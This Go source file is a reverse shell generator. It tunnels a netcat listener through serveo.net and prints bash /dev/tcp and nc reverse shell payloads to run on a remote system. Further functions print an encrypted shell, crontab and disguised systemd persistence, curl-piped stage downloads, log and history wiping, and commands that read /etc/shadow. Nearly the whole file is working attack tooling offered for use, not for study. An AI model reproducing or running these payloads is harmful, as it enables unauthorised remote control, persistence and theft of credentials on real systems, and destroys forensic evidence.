package main

import (
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"time"
)

// ANSI Colors
const (
	Red    = "\033[31m"
	Green  = "\033[32m"
	Yellow = "\033[33m"
	Cyan   = "\033[36m"
	Blue   = "\033[34m"
	Purple = "\033[35m"
	Reset  = "\033[0m"
)

func main() {
	localPort := 4444
	startPort := 4000
	endPort := 4100

	fmt.Println(Cyan + "[*]  Reverse Shell Generator v1.0" + Reset)
	fmt.Println(Blue + "[*] Features: TCP, HTTP, PTY Upgrade" + Reset)
	fmt.Println()

	fmt.Println(Cyan + "[*] Netcat listener starting (localhost:" + strconv.Itoa(localPort) + ")..." + Reset)
	go startListener(localPort)

	time.Sleep(1 * time.Second) // Listener

	for port := startPort; port <= endPort; port++ {
		fmt.Printf(Yellow+"[*] Traying: serveo.net:%d"+Reset+"\n", port)
		cmd := exec.Command("ssh", "-o", "ExitOnForwardFailure=yes", "-R",
			fmt.Sprintf("%d:localhost:%d", port, localPort), "serveo.net")

		cmd.Stdout = nil
		cmd.Stderr = nil
		err := cmd.Start()
		if err == nil {
			time.Sleep(2 * time.Second)
			fmt.Printf(Green+"[+] Successful: Reverse port serveo.net:%d\n"+Reset, port)
			printAllPayloads(port)
			cmd.Wait()
			os.Exit(0)
		}
	}
	fmt.Println(Red + "[-] No ports were used :(" + Reset)
}

func startListener(port int) {
	cmd := exec.Command("x-terminal-emulator", "-e", "nc", "-lvnp", strconv.Itoa(port))
	err := cmd.Start()
	if err != nil {
		fmt.Println(Red + "[-] Netcat could not be started. Terminal support may be missing." + Reset)
	}
}

func printAllPayloads(port int) {
	fmt.Println("Use one of these commands on the remote system:")
	fmt.Printf("    1. bash -c '(exec bash -i &>/dev/tcp/serveo.net/%d 0>&1) &'\n", port)
	fmt.Printf("    2. U=/tmp/.$$;rm -f $U;touch $U;(tail -f $U|sh 2>&1|nc -n serveo.net %d >$U 2>&1 &)\n", port)
	
	fmt.Println("Once connected, cut & paste the following into the _this_ shell:")
	fmt.Println("-------------------------------------------------------------------------------")
	fmt.Println(` "$SHELL" -c true || SHELL=$(command -v bash) || SHELL=/bin/sh
 command -v python >/dev/null \
    && exec python -c "import pty; pty.spawn('${SHELL:-sh}')" \
    || { command -v script >/dev/null && exec script -qc "${SHELL:-sh}" /dev/null; }
unset HISTFILE
export SHELL=/bin/bash TERM=xterm-256color
export LESSHISTFILE=-
export REDISCLI_HISTFILE=/dev/null
export MYSQL_HISTFILE=/dev/null
alias ssh='ssh -o UpdateHostKeys=no -o StrictHostKeyChecking=no -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-dss'
alias scp='scp -o UpdateHostKeys=no -o StrictHostKeyChecking=no -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-dss'
alias wget='wget --no-hsts'
alias vi='vi -i NONE'
alias vim='vim -i NONE'
reset -I
PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
stty -echo cols 200;printf "\033[18t";read -t5 -rdt R;stty sane $(echo "${R:-8;25;80}"|awk -F";" '{ printf "rows "$2" cols "$3; }')`)
	fmt.Println("-------------------------------------------------------------------------------")
	fmt.Printf("To force-exit this listener, type kill \"$(pgrep -P %d)\" on your Root Server\n", os.Getpid())
	fmt.Printf("Listening on serveo.net:%d\n", port)
	fmt.Printf("listening on [any] %d ...\n", port)
}



func printTechniques(port int) {
	fmt.Println(Green + "\n🔥:" + Reset)
	fmt.Println("─────────────────────────────────────────────")

	fmt.Println(Blue + "[ENCRYPTED]" + Reset)
	fmt.Printf("# OpenSSL Encrypted Shell\n")
	fmt.Printf("openssl s_client -quiet -connect serveo.net:%d | /bin/bash | openssl s_client -quiet -connect serveo.net:%d\n", port, port)

	fmt.Println(Blue + "[PERSISTENCE]" + Reset)
	fmt.Printf("# Crontab Persistence\n")
	fmt.Printf("(crontab -l 2>/dev/null; echo \"*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/serveo.net/%d 0>&1'\") | crontab -\n", port)
	fmt.Printf("# Systemd Service (Root)\n")
	fmt.Printf("echo '[Unit]\nDescription=System Update\n[Service]\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/serveo.net/%d 0>&1\"\nRestart=always\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/update.service\n", port)

	fmt.Println(Blue + "[MULTI-STAGE]" + Reset)
	fmt.Printf("# Stage 1: Download\n")
	fmt.Printf("curl -s http://serveo.net:%d/stage2.sh | bash\n", port+8000)
	fmt.Printf("# Stage 2: Execute advanced payload\n")

	fmt.Println(Blue + "[ANTI-FORENSICS]" + Reset)
	fmt.Printf("# History Bypass\n")
	fmt.Printf("unset HISTFILE; export HISTSIZE=0\n")
	fmt.Printf("# Log Cleanup\n")
	fmt.Printf("rm -rf /var/log/* /tmp/* ~/.bash_history\n")

	fmt.Println(Blue + "[PRIVILEGE ESCALATION HELPERS]" + Reset)
	fmt.Printf("# LinPEAS\n")
	fmt.Printf("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n")
	fmt.Printf("# GTFOBins Sudo Check\n")
	fmt.Printf("sudo -l\n")
}

func printUsageInstructions() {
	fmt.Println(Cyan + "\n═══════════════════════════════════════════════════════════════" + Reset)
	fmt.Println(Cyan + "                     INSTRUCTIONS FOR USE" + Reset)
	fmt.Println(Cyan + "═══════════════════════════════════════════════════════════════" + Reset)

	fmt.Println(Yellow + "\n🎯 AFTER SHELL:" + Reset)
	fmt.Println("1. whoami           - User control")
	fmt.Println("2. id               - Auth control")
	fmt.Println("3. pwd              - Dir  control")
	fmt.Println("4. uname -a         - Sytem  info")
	fmt.Println("5. ps aux           - Sctive transactions")
	fmt.Println("6. netstat -tulpn   - Network connections")
	fmt.Println("7. ss -tulpn        - netstat alternative")

	fmt.Println(Yellow + "\n🔍 KEŞİF KOMUTLARI:" + Reset)
	fmt.Println("find / -perm -4000 2>/dev/null        # SUID files")
	fmt.Println("find / -writable 2>/dev/null          # Writable files")
	fmt.Println("cat /etc/passwd                       # Users")
	fmt.Println("cat /etc/shadow 2>/dev/null           # Password hashes")
	fmt.Println("history                               # command history")
}
